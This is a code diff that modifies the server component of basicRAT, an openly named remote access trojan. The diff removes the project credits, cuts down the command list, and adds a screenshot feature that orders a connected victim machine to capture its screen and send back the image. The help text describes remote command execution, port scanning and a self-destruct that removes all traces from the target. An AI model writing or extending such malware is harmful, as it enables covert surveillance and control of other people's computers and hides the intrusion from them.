@@ -1,9 +1,5 @@
 #!/usr/bin/env python
 
-#
-# basicRAT server
-# https://github.com/vesche/basicRAT
-#
 
 import argparse
 import readline
@@ -13,43 +9,43 @@ import threading
 
 from core.crypto import encrypt, decrypt, diffiehellman
 
-
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
 BANNER = '''
- ____    ____  _____ ____   __  ____    ____  ______      .  ,
-|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
-|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
-|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
-|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
-|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
-|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
-         https://github.com/vesche/basicRAT
+                     .                  
+     ooo         ,-_-|        ,,,,,     
+    (o o)       ([o o])      /(o o)\    
+ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo-
+________/\\\\\\\\\_____________________________        
+ _____/\\\////////______________________________       
+  ___/\\\/______________/\\\__/\\\_______________      
+   __/\\\_______________\//\\\/\\\______/\\\\\\\\_     
+    _\/\\\________________\//\\\\\_____/\\\//////__    
+     _\//\\\________________\//\\\_____/\\\_________   
+      __\///\\\___________/\\_/\\\_____\//\\\________  
+       ____\////\\\\\\\\\_\//\\\\/_______\///\\\\\\\\_ 
+        _______\/////////___\////___________\////////__    
+
 '''
-CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
-                    'selfdestruct', 'survey', 'unzip', 'wget' ]
+CLIENT_COMMANDS = ['execute', 'ls', 'scan']
 HELP_TEXT = '''Command             | Description
 ---------------------------------------------------------------------------
-cat <file>          | Output a file to the screen.
-client <id>         | Connect to a client.
+client <id>         | fect to a client.
 clients             | List connected clients.
 execute <command>   | Execute a command on the target.
 goodbye             | Exit the server and selfdestruct all clients.
 help                | Show this help menu.
 kill                | Kill the client connection.
 ls                  | List files in the current directory.
-persistence         | Apply persistence mechanism.
-pwd                 | Get the present working directory.
 quit                | Exit the server and keep all clients alive.
 scan <ip>           | Scan top 25 TCP ports on a single host.
+screenshot          | Take a screenshot.
 selfdestruct        | Remove all traces of the RAT from the target system.
-survey              | Run a system survey.
-unzip <file>        | Unzip a file.
-wget <url>          | Download a file from the web.'''
+'''
 
 
 class Server(threading.Thread):
-    clients      = {}
+    clients = {}
     client_count = 1
     current_client = None
 
@@ -80,6 +76,16 @@ class Server(threading.Thread):
         try:
             recv_data = client.conn.recv(4096)
             print decrypt(recv_data, client.dhkey)
+        except Exception as e:
+            print 'Error: {}'.format(e)
+
+    def recv_schot(self, client):
+        imgFile = open('screenshot_server.png', 'w')
+        try:
+            recv_data = client.conn.recv(40960000)
+            imgData = decrypt(recv_data, client.dhkey)
+            imgFile.write(imgData)
+
         except Exception as e:
             print 'Error: {}'.format(e)
 
@@ -132,13 +138,17 @@ class Server(threading.Thread):
     def print_help(self, _):
         print HELP_TEXT
 
+    def screenshot(self, client):
+        self.send_client('screenshot', self.current_client)
+        self.recv_schot(self.current_client)
+
 
 class ClientConnection():
     def __init__(self, conn, addr, dhkey, uid=0):
-        self.conn  = conn
-        self.addr  = addr
+        self.conn = conn
+        self.addr = addr
         self.dhkey = dhkey
-        self.uid   = uid
+        self.uid = uid
 
 
 def get_parser():
@@ -150,8 +160,8 @@ def get_parser():
 
 def main():
     parser = get_parser()
-    args   = vars(parser.parse_args())
-    port   = args['port']
+    args = vars(parser.parse_args())
+    port = args['port']
     client = None
 
     print BANNER
@@ -164,13 +174,14 @@ def main():
 
     # server side commands
     server_commands = {
-        'client':       server.select_client,
-        'clients':      server.list_clients,
-        'goodbye':      server.goodbye_server,
-        'help':         server.print_help,
-        'kill':         server.kill_client,
-        'quit':         server.quit_server,
-        'selfdestruct': server.selfdestruct_client
+        'client': server.select_client,
+        'clients': server.list_clients,
+        'goodbye': server.goodbye_server,
+        'help': server.print_help,
+        'kill': server.kill_client,
+        'quit': server.quit_server,
+        'selfdestruct': server.selfdestruct_client,
+        'screenshot': server.screenshot
     }
 
     def completer(text, state):
